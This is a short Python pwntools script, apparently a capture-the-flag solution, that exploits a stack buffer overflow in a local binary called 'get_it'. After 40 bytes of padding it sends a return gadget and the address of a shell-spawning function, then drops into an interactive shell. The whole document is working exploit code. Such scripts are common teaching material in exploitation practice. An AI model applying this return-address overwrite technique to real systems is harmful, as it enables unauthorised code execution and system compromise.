from pwn import *

testpad = ""

padding = b"\x00"*40

ROP = p64(0x0000000000400451)
SHELL = p64(0x00000000004005b6)

payload = padding
payload += ROP
payload += SHELL

print(payload)

#p = gdb.debug('./get_it')
p = process('./get_it')

p.readuntil(b'Do you gets it??')
p.send(payload)


p.interactive()
